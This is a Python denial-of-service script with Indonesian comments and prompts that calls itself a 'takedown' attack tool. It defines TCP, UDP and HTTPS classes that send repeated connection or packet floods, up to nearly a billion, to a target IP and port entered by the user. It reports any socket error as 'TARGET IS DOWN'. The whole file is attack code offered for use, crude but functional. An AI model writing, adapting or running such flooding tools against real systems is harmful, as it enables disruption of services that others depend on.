import socket
import ssl

class TCPTakedown:
    DEFAULT_PORT = 80

    def send_tcp_packet(self, target_ip, target_port=None, num_packets=1):
        if target_port is None:
            target_port = self.DEFAULT_PORT
        try:
            for _ in range(min(num_packets, 999999999)):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.send(b'GET / HTTP/1.1\r\n\r\n')  # Ganti dengan payload sesuai kebutuhan
                sock.close()
                print(f"TCP packet sent to {target_ip}:{target_port}")
        except socket.error as e:
            print(f"Error sending TCP packet: {e}")
            print("TARGET IS DOWN")

class UDPTakedown:
    DEFAULT_PORT = 8080

    def send_udp_packet(self, target_ip, target_port=None, num_packets=1):
        if target_port is None:
            target_port = self.DEFAULT_PORT
        try:
            for _ in range(min(num_packets, 999999999)):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b'GET / HTTP/1.1\r\n\r\n', (target_ip, target_port))  # Ganti dengan payload sesuai kebutuhan
                sock.close()
                print(f"UDP packet sent to {target_ip}:{target_port}")
        except socket.error as e:
            print(f"Error sending UDP packet: {e}")
            print("TARGET IS DOWN")

class HTTPSTakedown:
    DEFAULT_PORT = 443

    def send_https_packet(self, target_host, target_port=None, num_packets=1):
        if target_port is None:
            target_port = self.DEFAULT_PORT
        try:
            context = ssl.create_default_context()
            for _ in range(min(num_packets, 999999999)):
                with socket.create_connection((target_host, target_port)) as sock:
                    with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                        ssock.sendall(b'GET / HTTP/1.1\r\n\r\n')  # Ganti dengan payload sesuai kebutuhan
                print(f"HTTPS packet sent to {target_host}:{target_port}")
        except socket.error as e:
            print(f"Error sending HTTPS packet: {e}")
            print("TARGET IS DOWN")

# Fungsi utama untuk menjalankan serangan kustom
def TakeDown():
    tcp_takedown = TCPTakedown()
    udp_takedown = UDPTakedown()
    https_takedown = HTTPSTakedown()

    target_ip = input("Masukkan alamat IP target: ")
    attack_type = input("Pilih jenis serangan (TCP/UDP/HTTPS): ").upper()
    num_packets = int(input("Masukkan jumlah paket yang akan dikirim: "))

    if attack_type == "TCP":
        tcp_takedown.send_tcp_packet(target_ip, num_packets=num_packets)
    elif attack_type == "UDP":
        udp_takedown.send_udp_packet(target_ip, num_packets=num_packets)
    elif attack_type == "HTTPS":
        https_takedown.send_https_packet(target_ip, num_packets=num_packets)
    else:
        print("Jenis serangan tidak valid.")
